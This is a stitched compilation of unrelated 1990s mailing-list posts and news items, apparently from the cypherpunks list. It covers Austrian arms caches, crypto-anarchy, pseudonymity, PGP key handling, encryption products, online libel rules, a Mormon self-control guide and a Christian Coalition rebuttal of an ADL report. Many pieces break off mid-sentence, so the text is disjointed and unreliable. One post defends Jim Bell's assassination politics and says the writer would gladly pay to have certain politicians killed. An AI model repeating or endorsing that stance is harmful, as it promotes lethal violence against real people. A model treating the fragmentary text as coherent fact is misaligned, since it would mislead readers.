anti-communist underground, Soviet troops would have
immediately annexed eastern Austria.
"It was all top secret. There were no archives, no papers
made, no protocols written," Molden told Reuters.  Molden said he was surprised that Austria's current political leaders were unaware of the arsenals. Details
had appeared in two books, one of which he wrote 16 years
Austrian media speculated that the arsenals were part of
a wider anti-communist strategy by the United States,
which feared Soviet expansionism following the end of
World War II.
Newspapers cited the Gladio operation in Italy, set up as
a secret Cold War resistance group in the 1950s to fight
any Warsaw Pact invasion.
Austrian experts estimated the depots held enough weapons
and explosives for 150 anti-communist guerrillas and
might also contain gold. They said likely sites included
graveyards where digging would have gone unnoticed.
Molden said arms were transported on U.S. trucks and
trains into Vienna, which was surrounded by the Soviet
eastern zone, and then secretly passed on to Austrians
who risked their lives stashing the weapons away.
He suspected most arsenals in western Austria were handed
over to the Austrian army and gendarmerie after 1955 and
that the arms sites in eastern Austria might now also be

There was some conversation about this recently on rec.gambling.other-games. Several people who work in the industry said that electronic machines
use some sort of PRNG, but with a nice added bit of random input - the
player's timing of hitting the buttons. One poster described it as the
machine constantly generating numbers, and choosing the payoff based
on the last number generated when the user hit a button.
I think that'd work pretty well. It's nice that this is in a slot
machine: typical computers can't afford to waste lots of time
throwing away random numbers.
There was also some speculation about whether the machines were immune
to electronic tampering.

Internet Scanner Software Checks Network Security Atlanta, Jan. 17 -- Internet Security Systems has
released version 3.2 of its Internet Scanner software. The company said the program is an "attack simulator"
that tests your organization's network for security
holes.  ISS said Internet Scanner 3.2 has enhanced reporting
capabilities and added tests for more than 130 security
vulnerabilities, including the recently revealed
Microsoft File Sharing bug. "Our added focus on Microsoft
security holes stems from our customers' rapid adoption
of TCP/IP (Transmission Control Protocol/Internet
Protocol)-enabled Microsoft Windows NT and Windows 95,"
said Chris Klaus, founder and chief executive officer of
ISS.  According to Don Ulsch, a security consultant affiliated
with the National Security Institute in Westborough,
Massachusetts, The movement to Windows 95 created a whole
new set of security concerns for network administrators.
"Similar to virus scanning software, a security scanning
tools' value to a corporation declines quickly unless it
can detect the latest security holes. In the security arena, every upgrade is crucial," said Ulsch.  New features of Internet Scanner 3.2 include added
reporting capabilities including hyperlinks that connect
to CERT advisories and vendor World Wide Web sites to
pull down patches and information regarding network
holes, and addition of Linux as a supported platform. The
company said that will allow easy scanning from laptop
PCs.  The additional tests added to the new version include the
Microsoft File Sharing bug, the TelnetD bug, the Stealth
Scan, Finger Bomb, and misconfigured Linux NIS services. The company said its customers who have current
maintenance contracts can now electronically download the

Some non-cypherpunks seem afraid of Tim May's cryptoanarchy, which, to quote Dr. Denning's recent paper, "suggest the impending arrival of a Brave New World in which governments, as we know them, have crumbled, disappeared, and been replaced by virtual communities of individuals doing as they wish without Perhaps these people are worrying needlessly.  I don't think cryptoanarchy (in this strong form) is a likely scenario for the future.  Even if strong cryptography and anonymous transaction systems are used by everyone, governments can continue to control people's physical actions and properties.  The physical world will continue to exist, even if it becomes relatively less I think a better prediction for the implications of strong crypto is what I would call "weak cryptoanarchy."  That is, cryptography will allow virtual communities the option to exist without the possibility of inteference by force.  Certainly some virtual communities, such as moderated discussion groups, will opt to have formal or informal governments.  The key is that people will have the choice of participating in communities where physical violence will be absolutely powerless.
Stated in this form, cryptoanarchy is hardly controversial.  Plus, this weak form of cryptoanarchy has a much better chance of being realized, because it does not require the collapse of existing governments, only the creation of new communities without governments.

Economist, 27 January 1995
Licence to make a killing
Spies and fund managers seem to be cut from the same
cloth. Both take calculated risks, are fickle when it
comes to allegiances and have an annoying tendency to
speak in code. More important, however, they both thrive
on inside information. This may be why, in the headlong
rush to exploit new emerging-market opportunities, a
growing number of investment funds are turning to former
spooks for some help.
The latest fund to tap the know-how of the intelligence
community is the Scottish American Investment Company,
based in Edinburgh, which invests heavily in
international equities. On January 17th it announced that
Sir Colin McColl, the former head of M16, Britain's
foreign-intelligence service, is joining its board of
directors. The fund hopes that Sir Colin's experience in
gauging political risks -- he has worked in Eastern
Europe and SouthEast Asia -- will improve the quality of
its investment decisions.
Another ex-spy turned fund manager is Harry Fitzgibbons,
a former American agent and now managing director of Top
Technology Limited, a fund-management group based in
London. Last year, he teamed up with Alexey Vlasov, a
former Soviet agent, to launch a new high-technology fund
for investment in Russia. It employs three other former
Soviet agents in its St Petersburg office.
Why are spooks so sought after by international
investors? The reason, says Mr Fitzgibbons, is that
spying is the ideal training ground for a career in
emerging-market investing. Not only are intelligence
agents good at spotting when someone is lying, but they
are also experts at building relationships and waiting
patiently for them to develop: two essential traits for
successful long-term investors. Mr Fitzgibbons argues
that it is these general skills, rather than any specific
local knowledge, that makes former spies such attractive
Unfortunately, old adversaries do not always get on as
swimmingly as Messrs Fitzgibbons and Vlasov. In 1994, for
example, the Vietnam Frontier Fund invited William Colby,
a former director of America's Central Intelligence
Agency, who headed the agency's Vietnam station during
the Vietnam War, to join its board of directors. His
appointment prompted the fund's chairman, Nguyen Xuan
Oanh, a former deputy prime minister of South Vietnam, to
quit. Not only did the fund lose its chairman, but it was
unable to take advantage of Mr Colby's experience: he
left the board in December 1994 after Hanoi refused him
a visa.
Despite such drawbacks, the demand for former spooks is
rumoured to be growing. One such hint comes from Parvus,
a consultancy (with offices in Moscow and Silver Spring,
Maryland) that employs a number of ex-spies. The firm
claims that it has just been contacted by a headhunter
looking for recruits. The mission, should anyone choose
to accept it, is to head up a new intelligence unit for
a big New York mutual fund. Unfortunately for potential
applicants, the headhunters say that the fund's name is
still top secret.

A short 'rant' on techno-dinosaurism...
Saw a blurb on CNN last night about computerized missiles
that would defeat jamming devices and analyze the type of
target and configure their warheads appropriately.  All that
I could think of is what an expensive waste of computing
machinery... is the cost of a "genius bomb" (assuming it does actually work, unlike the Patriots in Gulf War) worth
while?  Wouldn't it be better to use a lot of dumb bombs that
launch several millions of dollars apiece at a tank or bit
of artillery?
I'm reminded of the tech they used to detect guerrillas in
Vietnam... sensors that went off when uric acid (?) was present
so the VC would pis in buckets and walk away, making the
sensors go wild... the US put a lot of effort into bombing
pis buckets.
Or look back to the 13th century when European soldiers were
high-tech wearing tons of armor and used cross bows.  it was
imposing high-tech for the time, but they couldn't move fast or
fire arrows quickly... and they were skagmeat for Mongols
who were comparatively low-tech.
Cypherpunks or crypto relevance?  Sometimes high-tech can be
a weakness.
I've heard that the Soviets, not having the luxury of sexy

do their cryptanalysis... and so may have a lot of interesting

I'm glad this interesting conversation came up. I apologize for
writing this anonymously, but I don't want to do anything to associate
my nym with my conventional name. The very act of comparing the
actions of the two entities would endanger my anonymity.
I use a nym to talk publically about a certain topic that, while it is
legal and not really that embarassing, I would rather not have
associated with my conventional name. In particular, I don't want my
thoughts on this topic to be archived by my conventional name. So I
use a nym, and it basically works. I think a really determined person
could break my nym even today, but I don't think anyone will ever be
that determined and I'm not that worried about it.
Yes, each nym (and your conventional name, which in some ways is just
another nym) has to have its own, independent reputation. I don't know
any way around this. The whole point of a nym is so the actions of
your nym don't affect the reputation of your conventional name.
You could tell trusted people about the association between your nym
and your conventional name, but you're compromising your nym in doing
that. You have to develop a threat model - how seriously do you want
to keep your anonymity?
A perfectly secure one does, by definition - if no one can ever
associate your nym with your conventional name, in particular if no
one knows that you have a nym, then there is no problem. The question
is, how close are we today to that perfection?  Getting lots of mail
from remailers currently looks supicious.
Yes. One thing to remember is that a response block associates an
email address with a public key for ever and all time. To be safer,
you need to not let mail from the nym go back to a private email box.
True anonymity is inconvenient.

Of course.  My signature was bad.
  I got a message in response to a request I made to someone for their public

to cypherpunks, but their key was not on the keyservers.  The key they

Don't worry about being a 'newbie'.  Everyone starts somewhere.  However,
your key will usually not 'find its way' to a server without you
specifically sending it.  The keyserver I usually use is accessed by sending
a mail message which fits the following format.  As far as I know, all the
keyservers use this format to add or update keys in their databases.  You
only have to send it to one keyserver, and it will propagate to all the
others.  I have indented the text so that no handlers decide to interpret it
as a new message.

If you don't admit you don't know something, nobody will usually tell you
how to do it.  Also, you should sign your own key.  That will make it harder
to forge, I think.  The reasons were spelled out in a couple of the web
pages I read, but I've forgotten them.  It has something to do with either a
denial of service attack or a man in the middle attack, or both.  The
command to do this is:
pgp -ks 0xHEXKEYID
Honestly, I've only just begun to use pgp myself.  Also, you should add your
e-mail address to the user-id of your key.  The command to do so is: pgp -ke 0xHEXKEYID
You will be asked if you wish to add a user id to the key.  Say yes, and
give it your e-mail address.  What this does is it allows people who are
using pgp-enabled mailers to directly encrypt messages to you without
choosing your key manually.
The reason that I have not encrypted this message to you using the key you
provided is that when I extracted the key and re-checked your message, the
signature was no good.  I've found that (using eudora) I must turn off the
word wrap feature of my mailer to allow for good signed messages out.  Of
course, having said this, I'll probably not get a good signature on this
message.  Let me know if it signs ok.
Now, I have a question.  Which attack(s) is/are a person vulnerable to when
distributing an unsigned public key in the open?  Could this actually be a
complex man-in-the-middle attack?  Am I paranoid?

GTE & Cylink Team On Encryption For ATM
Washington, D.C., 31 January 1996 -- During a press
conference last night at Comnet, GTE and Cylink unveiled InfoGuard 100, a jointly developed offering billed as the
first encryption system able to work with ATM
(asynchronous transfer mode).  InfoGuard 100 is meant to provide the security needed to induce business and government to use ATM public
networks, said Michael M. Guzelian, GTE's marketing
director for broadband systems, speaking at the press
conference.  GTE is the number one provider of encryption to the
federal government, while Cylink holds a 70 percent share
of the commercial encryption market, according to Kamy
Kavianian, senior product marketing manager at Cylink for
SecureWAN.  GTE and Cylink will also jointly market the new ATM encryption system. "The deal (for InfoGuard 100) is
mutually exclusive, but we don't know anyone else who can
do it," noted Jeff Callo, Cylink's director of business
InfoGuard consists of two main components, according to
the officials. An ATM adapter from GTE provides ATM
interfaces and cell processing and control functions.  Cylink's CIDEC-VHS contributes "high-speed data
encryption and decryption," in addition to physical
security and "full automated key functions."  Kavianian told the journalists that InfoGuard 100 is
based on DES encryption. Users of InfoGuard will foil
"key exhaustion," a method used for breaking encryption
codes, if they "change their codes frequently," Guzelian
added. Essentially, CIDEC-VHS has turned out to be "the first encryption method fast enough to keep up with ATM,"
Guzelian maintained.  The agreement between Cylink and GTE represents "an excellent example of coopetition," Callo said.

European Commission Moves To Stamp Out Racism On Internet
Burssels, 31 Jan 1996 -- The European Commission (EC) has
formed a pan-European group to "encourage the mixing of
people of different cultures" from both inside and
outside Europe.  According to EC officials, the first task of the
Consultative Commission on Racism and Xenophobia (CRAX),
as it is called, will be to investigate and, using legal
means, stamp out the current wave of racism on the
Internet.  In a prepared statement, CRAX said that it hopes that the
EC "will take all needed measures to prevent the Internet
from becoming a vehicle for the incitement of racist
hatred."  EC officials are soft-peddling on what legislation they
plan to enact to back up the investigations of CRAX.
Currently, apart from France and Germany, there is no
specific anti-racist legislation.
The laws of France and Germany were created in the
aftermath of the Second World War in order to prevent the
rising of the so-called "Fourth Reich," an extremist
group which posts messages on the Internet, as well as
running Thule bulletin board systems (BBSs) in Germany. According to EC officials, the Thule BBSs, which first
appeared in 1991, started spreading the Neo-Nazi word on
the Internet in late 1994, having established themselves
as a means of information exchange in Germany and, to a
limited extent, in France.
As reported previously, the "Thule Network" first came to the public's attention when the January, 1994, issue
of Chip magazine (a popular computer monthly in Germany)
claimed to have unearthed eight Thule BBSs.  According to Chip magazine at the time, "The (Thule)
network distributes information on demonstrations and
invitations to meetings, addresses for contacting parties
and groups, and it reviews and offers books and
magazines. One of the mail-boxes contained instructions
for producing military explosives and letter bombs. A
great deal of space is taken up by 'political
discussions' among the users."
Thule is Norse or Viking terminology for "top of the
world." The Thule Network's name actually derives from
the small, elitist 1920s movement which was considered to
be the Nazi vanguard. Thule movement leaders included
Rudolf Hess. Some BBSs on the Thule network have names
such as "Wolf Box" and "Resistance," while many Internet
messages are signed by people calling themselves "The
Wolf," among other names.

UK - New Rules For Online Libel Called For
Wokingham, Bershire, England, 31 January 1996 --
CompuServe, Europe Online, and Microsoft Network (MSN),
have banded together to lobby the British Government for
a clear definition of the legal rules for online libel. In British law, libel is defined as a defamatory
statement. Because of the "new" nature of online
services, however, online libel is treated as something
of a gray area as regard legal issues.
In a joint submission to the Lord Chancellor's
department, the three online companies claim that online
service providers typically cannot control the content of
messages that users of their services or the Internet,
The companies are recommending that the online service
provider not be held responsible for libels statements
made online, unless the service provider has "reasonable
notice" that a libels statement has been transmitted on
to its system, and "has the ability and the authority to prevent" its publication, but "fails to do so" within
a reasonable time.  According to Andrew Gray, European business manager with
CompuServe, the Chancellor's Department is currently
conducting an extensive review of UK libel law to deal
with a number of current problems. Based upon this
review, the Government is expected to introduce new libel
legislation this spring.
"We applaud the Lord Chancellor's Department's efforts to
bring the defamation law up to date. We hope that the
upcoming legislation will deal effectively with the
problem of libel that takes place over an online service
or the Internet," Gray explained.
Andreas Breijs, manager of Europe Online, meanwhile, said
that online services are not like traditional newspapers
or magazines. "These services are more like a railway
train, where the operator may own the passenger cars, but
has no idea what the passengers may be saying to each
other, and no way of controlling their conversations," he
Judy Gibbons, manager of Microsoft's MSN operating in the
UK, said that the major online providers work hard to run
responsible services. "They should not be penalized for
the actions of unrelated individuals who might happen to
make libelous statements using their services without the
knowledge or consent of the service provider," she said. Alistair Kelman, a lawyer specializing in information
technology (IT) affairs, said that he was not surprised
by the online services' request to the Lord Chancellor's
Department, especially given the current situation.  "There is no case law on this subject and it is likely
that a test case will come sooner, rather than later. The
Government is keen on a clarification on the issue, as it
is itself publishing a lot of its information on the
Internet, in the move towards a more open and IT-relevant
Government," he explained.
Peter Sommer, an IT security specialist and Fellow of the
London School of Economics, said that, far from being
just another publishing medium, it was important that
people understand that the Internet is very similar to a
telephone line.
"If I libel someone over the phone, you're not going to
involve the telephone company, are you? It's the same
with the Internet and some online services. Of course, if
the online service has the ability to remove someone's
comments and does not do it, then it's a different matter
and that is what the definition by the Lord Chancellor's
office is all about," he said.

I am.
Russ, this rant is not directed at you. I'm just weary of the Bell-bashing.
Perhaps the reason that our society has evolved to the point of not having to fear deathsquads is because of assholes like Bell who keep prodding us to expand the limits of personal liberty and free speech by their rantings.  He makes me think; sometimes the unthinkable, and gives me the opportunity to _reject_ his ideas.
Each time I suggest that someone goes *a little too far,* I draw in the circle of my own protected speech a bit more. *My God, he can't say that!" He _may_ be an adult who knows and accepts the possible consequences of his speech. Notice the chilling effect on virtually any discussion when the threat of legal action is suggested.  There's the danger.
Read the entire quote by Donne.  *...any man's death diminishes me, because I am involved in mankind;...*  By protecting Bell's right to speak what he thinks, we serve as an example to the rest of the world of what personal freedom really means. *Those crazy Americans* Bell gives me the opportunity to say that his pronouncements are antithetical to the best interests of the _inhabitants_ of this nation, not simply the government itself.

Untruth  Aside from the "religion" red herring you tossed in (it's a cult), the critics expose the lies, doubletalk and inconsistencies posted by cult apologists. (It should be noted that these people aren't generally "just another satisfied Scientologist," but are cult employees who are carefully vetted to distribute propaaganda without ever answering critics' questions.)
So what's your point? Besides, there is no Cabal fnord. :-)
Untruth  Articles canceled from a.r.s. have been multiple postings of standard Scientology tracts (over 10,000 in all, so my newsreader says), spread out over various alleged users. These aren't intended to promote discussion -- they're intended to bury the newsgroup in noise.

Bryce wrote (whilst on his high horse):
Not every member of this list rejects his views.  I for one do not
reject them outright, but will not defend his views publically for
fear of embarassing the corporation that I work for. I do not
reject Jim Bell's violent views for the simple reason that violence
is often required to fight violence.  In other words, the best you
can hope for is "... but his violent views were rejected by some
members of the group."
He *is* a member. And why shouldn't he be?  Are you suggesting that
this group become moderated? (hiss).  The whole AP concept is very
relevent to the Cypherpunks, whether the majority like it or not.
No platform for lunatics???  If there is one thing that a Cypherpunk
should have learned during his time in the group, is that the answer
to hate speech (or violent speech, or whatever you wish to call it)
is more speech.
If your fear is that reporters will get hold of the wrong end of the
stick, then perhaps you are correct, but the real problem is the
*reporters*, not the attitude of the Cypherpunks.  blame them.
propose a solution. (how about abolition of all libel laws?)
I disagree with the phrase "evil enthusiasms."  Bell is not an
evil man.  A little crazy perhaps, but not evil.  If you bothered
to listen to him, you would find that his aim is to create a
"better" world, where people (especially politicians) are very
much more responsible for their own actions.  He suggests that
the number of deaths due to AP will be less that the number of
deaths due to the current corrupt system.
think about it.  how many on this group would have another man
killed for his views?  For his noisy stereo?  For a competive
advantage in business?  I am confident the answer will be zero.
On the other hand, I would gladly throw in a few dollars to have
certain politicians killed.  gladly.  and I will be able to sleep
at night.  I will sleep better knowing that, although I was
partly responsible for a mans death, I will have saved countless
others (a bit like dropping an a-bomb on Japan).

@_subject: A guide to self control (Was funny underwear) 
A Guide to Self-Control
  Subject: Steps in Overcoming Masterbation
 Excerpt from a Mormon missionary guide, circa 1970: Steps in
 Overcoming Masterbation, Mark E. Petersen
   1. Never touch the intimate parts of your body except during normal
       toilet processes.
   2. If you are associated with other persons having this same
      problem, YOU MUST BREAK OFF THEIR FRIENDSHIP. Never associate
      with other people having the same weakness. Don't suppose that
      two of you will quit together, you never will. You must get away
      from people of that kind. Just to be in their presence will keep
      your problem foremost in your mind. The problem must be taken OUT
      OF YOUR MIND for that is where it really exists. Your mind must
      be on other and more wholesome things.
   3. When in bed, if that is where you have your problem for the most
      part, dress yourself for the night so securely that you cannot
      easily touch your vital parts, and so that it would be difficult
      and time consuming for you to remove those clothes. By the time
      you started to remove protective clothing you would have
      sufficiently controlled your thinking that the temptation would
      leave you.
   4. If the temptation seems overpowering while you are in bed, GET
      OUT OF BED AND GO INTO THE KITCHEN AND FIX YOURSELF A SNACK,       even  if it is in the middle of the night, and even if you are not
      hungry, and despite your fears of gaining weight. The purpose
      behind this suggestion is that you GET YOUR MIND ON SOMETHING
      ELSE. You are the subject of your thoughts, so to speak.
   5. Never read pornographic material. Never read about your problem.
      Keep it out of mind. Remember -- "First a thought, then an act."
      The thought pattern must be changed. You must not allow this
      problem to remain in your mind. When you accomplish that, you
      soon will be free of the act.
   6. Pray. But when you pray, don't pray about this problem, for that
      will tend to keep [it] in your mind more than ever. Pray for
      faith, pray for understanding of the Scriptures, pray for the
      Missionaries, the General Authorities, your friends, your
      families, BUT KEEP THE PROBLEM OUT OF YOUR MIND BY NOT       MENTIONING  IT EVER -- NOT IN CONVERSATION WITH OTHERS,       NOT IN YOUR PRAYERS.  KEEP IT _OUT_ of your mind!
   7. Be outgoing and friendly. Force yourself to be with others and
      learn to enjoy working and talking to them. Use principles of
      developing friendships found in books such as _How to Win Friends
      and Influence People_ by Dale Carnegie.
   8. Make a pocket calendar for a month on a small card. Carry it with
      you, but show it to no one. If you have a lapse of self control,
      color the day black. Your goal will be to have _no black days_.
      The calendar becomes a strong visual reminder of self control and
      should be looked at when you are tempted to add another black
      day. Keep your calendar up until you have at least three clear
      months.
   9. In the field of psychotherapy there is a very effective technique
      called _aversion therapy_. When we associate or think of
      something very distasteful with something which has been
      pleasurable, but undesirable, the distasteful thought and feeling
      will begin to cancel out that which was pleasurable. If you
      associate something very distasteful with your loss of
      self-control it will help you to stop the act. For example, if
      you are tempted to masturbate, think of having to bathe in a tub
      of worms, and eat several of them as you do the act.
  10. Keep your bladder empty. Refrain from drinking large amounts of
       fluids before retiring.
  11. Reduce the amount of spices and condiments in your food. Eat as
       lightly as possible at night.
  12. Avoid people, situations, pictures or reading materials that
       might create sexual excitement.
  13. It is sometimes helpful to have a physical object to use in
       overcoming this problem. A Book of Mormon, firmly held in hand,
       even in bed at night has proven helpful in extreme cases.
  14. In very severe cases it may be necessary to tie a hand to the bed
       frame with a tie in order that the habit of masturbating in a
       semi-sleep condition can be broken.
  15. Do not let yourself return to any past habit or attitude patterns
       which were part of your problem. Satan Never Gives Up. Be calmly
       and confidently on guard. Keep a positive mental attitude. You
       can win this fight! The joy and strength you will feel when you
       do will give your whole life a radiant and spiritual glow of
       satisfaction and fulfillment.

@_subject: Announce: 155mbps ATM 3DES crypto gateway 
Secant Network Technologies announces:
The Key Agile Encryption System is an affordable perimeter security
system that provides privacy through high speed cryptography for
information traversing public Asynchronous Transfer Mode networks.
The cryptographic units function as "bump in the fiber" security
interfaces between a secure LAN and a public network.
As data crosses this interface, the system encrypts each ATM cell's payload
without affecting the header. Encrypted cells pass through the
public network infrastructure and are decrypted upon arriving at
the destination LAN. The benefit is that the user can conduct business
as usual within the LAN and only encrypt the data as it enters
the non-secure public network (or non-secure area of a LAN).
Many individual workstations, servers or other end nodes may be protected
by a single encryption unit. The system provides privacy and access
control guarantees when using public ATM networks today, eliminating
the need to wait for implementation and availability of pending
ATM Forum security standards. System operation is transparent to
all network and end user systems.
Available: summer 1996
Physical interfaces: single mode SONET OC-3c, multi mode SONET OC-3c,
        T3 carrier, T1 carrier.
Key management: proprietary method, transparent to network and end user
        equipment, compliant with UNI 3.0/3.1 specifications. SVC's
        handled transparently, PVC support available.

This came from Associated Press (27th Feb) :
Europe pushes Asian weapons sales
KUALA LUMPUR, Malaysia - Russia is doing it. So are Britain, France,
Germany and Spain. Even neutral Sweden has joined the race to sell
warplanes, missiles, tanks and warships for Asia's rapidly expanding
The Europeans, fighting an uphill battle against dominant U.S. competitors,
are offering what the Americans sometimes won't - the newest, deadliest
technology with no political strings attached.
While post-Cold War budget cutting devastated the arms trade in the rest of
the world, military spending in Asia is still rising.
totaled $3.4 billion - a 30% increase over their sales in the 1987-1990
period, according to figures compiled by economist Digby Waller of the
International Institute of Strategic Studies in London.
By contrast, American weapons sales in the region were $5.4 billion in
1991-1994, a 7% decline from the previous three-year period.
Despite widespread agreement that U.S. weapons makers are technologically
superior, European producers have signed a flurry of deals with nearly
every Asian country.
According to military analysts, buyers were attracted by Europe's lower
prices, equipment - like submarines - that the United States doesn't sell
and - perhaps most important - the chance to avoid becoming dependent on
American suppliers in case the United States cuts back future arms exports.
In one of the most powerful signs of the Asian market's allure, Russia
tossed out ideological considerations in favor of cash, selling its former
Chinese rivals high-performance Sukhoi 27 jet fighters and the technology
to make more.
Thailand bought an aircraft carrier from Spain. Taiwan bought six frigates
and 50 fighter jets from France. South Korea bought three German cruisers
and Malaysia bought two British frigates.
Sweden sold diesel-electric submarines to Thailand and Singapore. The
United States no longer manufactures such vessels, partly in an attempt to
halt their proliferation. Such submarines are very quiet and almost
impossible to detect, even with sophisticated equipment.
Some military analysts argue the unprecedented weapons buildup will ignite
an arms race in a region crisscrossed by territorial disputes. They point
to the growing military might of Japan, China and India and a series of
smoldering regional disputes, including those between Taiwan and China and
between North and South Korea.
Asian governments counter that they're entitled to defend their territory.
"It is wrong to see the purchase of defense equipment by countries in the
region as an arms race,'' Singapore's defense minister, Tony Tan, said in a
TV interview in January.
"We and our ... neighbors are proceeding with plans to modernize our armed
forces, now that our economies have grown and we have the resources to pay
for better weapons and equipment.''
The biggest potential source of conflict in the region is China's feud with
its Southeast Asian neighbors over oil and gas riches in the South China
Sea. China has declared the entire region its territory, and sent warships
to enforce the claim.
While European governments try not to fuel arms races, they may sell to
buyers who are refused American weapons for political reasons, said Paul
Beaver, a military analyst for Jane's Information Group.
Beaver pointed to the example of Britain's $35 billion deal to supply
Tornado fighters and other weapons to Saudi Arabia after the United States
balked at selling warplanes that could be used to attack Israel.
"That has been seen by the Muslim countries in Southeast Asia as a strong
sign that Britain doesn't attach the same political conditions to its sales
as the United States does,'' he said in a telephone interview from London.
Thailand wants to buy advanced American AMRAAM missiles to arm its new F-18
fighters. But because no other country in the region has a missile that
sophisticated, the Clinton administration is hesitating for fear of
sparking competition among Thailand's neighbors to match it.
"If the United States did not want to sell AMRAAM missiles to Thailand, I
wouldn't be surprised if France would be willing to sell a similar
missile,'' said Pieter Wezeman, a researcher for the Stockholm
International Peace Research Institute.
Asian governments also appear to be buying European weapons to diversify
their arsenals in case Washington shuts off their supply.
"The United States has shown several times that they don't want to sell
weapons to everyone, and so at any moment they might start an embargo,''
Wezeman said.
In one of the region's biggest recent sales, Taiwan bought 210 fighter
jets, splitting the order between French Mirage-2000s and U.S.-made F-16s
after Washington first refused to sell and then approved fewer planes than
Taiwan wanted.
Pakistan, blocked by U.S. law from buying F-16s because of evidence it has
built nuclear weapons, is reported to be shopping for French or Russian
warplanes to fill the gap.

The photo equipment, records, and photographs were returned but not after making Sturgis' life a living hell...
Sturgis' work which has critical acclaim throughout art circles and has
two books profiling naturalists, has been quoted to saying that before taking

the he never thought twice before the FBI raid.
Mr. Avon should think twice before commenting on self censorship does not

ADL Report
"The Anti-Defamation League has committed defamation. There is no other conclusion to be reached after reading its new report, The Religious Right: The Assault on Tolerance and Pluralism in America. It is sad that an organization with a proud history of fairness should have descended to this kind of character assassination and name calling."
- Columnist Mona Charen (1)
"In my twelve Senate years I worked with many of the 'Religious Right.'  They were active in the cause of Soviet Jewry (many Pentecostals and other Christians couldn't leave the Soviet Union either). They were fervent supporters of the State of Israel and we worked together often. Among the leadership of Conservative Christians I never experienced even a hint of anti-Semitism. Indeed, it was quite the opposite-I am Honorary Vice-Chairman of the ADL. I am proud of that-But in this instance I strongly disagree. From all my experience I know their report to be ill-founded. Regretably it will do more harm than good."
- Former U.S. Senator Rudy Boschwitz, Honorary Vice-Chairman, ADL (2)
On June 9, 1994, the Anti-Defamation League of B'nai B'rith, an organization created to fight defamation, released a report that alleges - with shoddy research and threadbare scholarship - that politically active people of faith pose a threat to the survival of American constitutional democracy. The ADL accuses numerous religious conservative organizations and leaders of anti-Semitism and bigotry. In so doing, the ADL itself has committed defamation. The ADL's new definition of "intolerance" apparently is disagreement with its liberal politics. The ADL report is filled with fabrications, half-truths, innuendo and guilt by association that are reminiscent of the political style practiced by Joseph McCarthy in the 1950s.
Persons of impeccable character and reputation are smeared for dubious reasons or for no reason at all. This style of politics is beneath the dignity of any organization that claims to be dedicated to fighting bigotry.
The response to the ADL report has been dismay from Jews and Christians alike. "Politically active Christians, the ADL concludes, are-well, 'extremist,' 'bogus,' 'conspiratorial,' 'fevered,' 'phony,'...and yes, 'fervent.' Protestant evangelicals are simply de trop, an object of condescension and prejudice," observed William Kristol, former chief of staff to Vice President Dan Quayle. (3)
Columnist Don Feder of the Boston Herald calls the report "an attempted political assassination." Feder adds, "Instead of debating the issues like a gentleman, it stoops to implications of anti-Semitism to discredit a legitimate voice in the values debate." (4)
Beth Gilinsky of the Jewish Action Alliance calls the ADL report "a plainly partisan smear campaign against traditional Christians who energetically - and quite legitimately -  advocate what they believe are important moral and social values." She concludes that although "Jewish-Christian friendship will survive the onslaught from the ADL, we are getting rather tired sweeping up after repeated ADL fiascos." (5)
This report specifically addresses those portions of the ADL document concerning the Christian Coalition. First, we will briefly examine the shoddy nature of the ADL's pseudo-research, and the report's heavy reliance on sources of questionable veracity. Second, we will discuss how the Christian Coalition really operates and discuss our true agenda of pluralistic democracy, nonpartisanship and inclusion. We also will discuss in detail the Coalition's nonpartisan voter guides and organizational structure and purposes.
The ADL's Pseudo-Research
The ADL claims its report was the culmination of nine months of research, but it bears none of the signs of a serious research report. It is virtually devoid of specific references to resource materials. (6)   The reader is left to simply take it on faith that the ADL's most damning charges are true, which they are not. In fact, much of the ADL's report is simply a retread of materials (some over a decade old) from groups like People for the American Way, Americans United for the Separation of Church and State, the Institute for First Amendment Studies and other groups that long have had political axes to grind against religious conservatives. (7)   Most disturbing, the ADL never contacted the Christian Coalition to get its response to their unfounded charges, nor did the ADL try to ascertain the accuracy of many of the quotations used in their report. This is particularly disturbing considering the fact that many of the groups and persons attacked have been!
  longstanding friends of the Jewish community, the State of Israel and the ADL.
In 1993, in seeking to settle charges that it had violated the privacy of certain individuals, the ADL sought to avoid legal liability by claiming that it enjoyed "journalistic status," making it "similar to any newspaper, magazine, or television station." (8)  If so, then the ADL has violated even the most basic principles of ethical journalism.
Had the Christian Coalition or its leadership been contacted for clarification, many of the errors in the report would have been corrected. Instead, the report is filled with gross inaccuracies of fact. Quotations are listed without attribution, while others are listed (incredibly) as coming from the "library of People for the American Way." A quotation from Pat Robertson on church-state separation has no source listed at all. (9)  Of 28 quotations attributed to Paul Weyrich, founder of the Washington-based Free Congress Foundation, 22 have no source for the quote. (10)
Numerous Factual Errors
Basic biographical errors abound. For instance, the ADL report says that Christian Coalition executive director Ralph Reed, Jr. once worked as a "campaign staffer for Georgia Rep. Newt Gingrich, former Georgia State Sen. Mack Mattingly and Sen. Jesse Helms of North Carolina." (11) Reed never has been employed on the campaign staffs of any of these individuals. He never was employed by Rep. Newt Gingrich in any capacity. He worked for Students For America, an independent organization, during the 1984 Senate race in North Carolina. He has never been employed by Senator Jesse Helms. He served as an intern for Mack Mattingly in the U.S. Senate in the summer of 1981. Mattingly was a U.S. Senator, not a state Senator, from Georgia.
Reed never made the comment attributed to him by the ADL calling for "a country once again governed by Christians-'."(12) Indeed, when asked on the NBC Meet the Press program in 1992 whether he believed America was a "Christian nation," Reed disagreed. "I think the only difference that I would have with it is - and I should probably preface this by telling you that I began my political career as the executive director of the first Jewish national chairman of the College Republicans in the history of the Republican party - I do think that you have to acknowledge the role that Jews have played and will continue to play, and I think there's a commonality among Jews and Christians on a lot of issues because again, ultimately it's a faith that I think has a lot of common values."(13)
It is not as though adequate documentation of Dr. Reed's views was unavailable to the ADL. As recently as February of this year, the New York Times news service carried an extensive profile that noted, "At the same time, the coalition is making overtures to minorities and Jewish leaders, hoping to bring some diversity to what has so far been a remarkably homogeneous movement." Arthur Kropp of People for the American Way added, "I disagree with [Reed] wholeheartedly, but I don't detect a mean spiritedness in him that you detect in other leaders. There's a political astuteness, perseverance, and intelligence."(14)
The ADL also misspells the name of the Coalition's Director of Legislative Affairs, Marshall Wittmann. This could not have been a typographical error, as Wittmann's name appears incorrectly spelled throughout the report. Cursory  fact-checking should have caught this error. (15)
